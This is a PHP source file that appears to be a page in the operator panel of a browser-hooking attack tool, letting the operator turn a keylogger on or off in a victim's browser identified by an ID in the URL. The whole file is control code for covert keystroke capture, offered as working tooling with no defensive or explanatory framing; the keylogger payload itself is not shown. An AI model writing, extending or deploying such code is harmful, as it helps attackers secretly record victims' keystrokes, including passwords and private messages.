<?php
    include_once('../../inc/commands.inc.php');
    $keyloggerState = getKeyloggerState($_GET['browserId']);


    if(isset($_POST['command']) && $_POST['command'] == 'keylogger') {
        if(!keylogger($_GET['browserId'], $_POST['state'])) {
            $execCommand = "Command sent successfull";
        }
        else {
            $execCommand = "Error while sending command";
        }
    }


?>

<html>
    <head>
        <meta charset="UTF-8">
        <title>Keylogger.js</title>
    </head>
    <body>
        <div>
            <p>
                This command Enable/Disable the keylogger functionnality
            </p>
            <div>
                <?php
                    if(isset($execCommand)) {
                        echo $execCommand;
                    }
                ?>
            </div>
            <div>
                <div>
                    <form action="" method="POST">
                        <div>
                            <?php
                                foreach ($keyloggerState as $row) {
                                    echo 'Actual state is : ' . $row['state'];
                                    if($row['state'] === 'disabled') {
                                        echo '<input type="hidden" name="state" value="enable"/>';
                                    }
                                    else {
                                        echo '<input type="hidden" name="state" value="disable"/>';
                                    }
                                }

                            ?>
                            <input type="hidden" name="command" value="keylogger"/>
                            <button type="submit" name="execute">Execute</button>
                        </div>                       
                    </form>
                </div>
            </div>
        </div>
    </body>
</html>


  